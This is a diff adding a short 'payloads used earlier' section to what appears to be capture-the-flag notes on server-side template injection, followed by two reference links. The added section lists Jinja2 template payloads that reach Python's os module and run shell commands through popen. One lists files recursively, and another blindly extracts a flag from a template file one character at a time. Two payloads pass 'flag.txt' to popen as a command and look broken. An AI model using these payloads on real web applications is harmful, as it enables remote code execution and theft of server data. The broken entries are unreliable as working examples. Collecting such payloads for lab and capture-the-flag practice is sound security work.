@@ -161,6 +161,16 @@ Razor (.Net):
 
 ```
 
+Some payloads used earlier:
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}} - Gives list of files in directory
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('flag.txt').read()}}
+
+{{__self__.__init__.__globals__.__builtins__.__import__('os').popen('flag.txt').read()}}
+
+{% if request.application.__globals__.__builtins__.__import__('os').popen('grep -io flag.*\} ./app/templates/admin.html').read().startswith('" + str(x) + "') %} found {% endif %}
+
 Further Refrences:
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 https://github.com/swisskyrepo/PayloadsAllTheThings
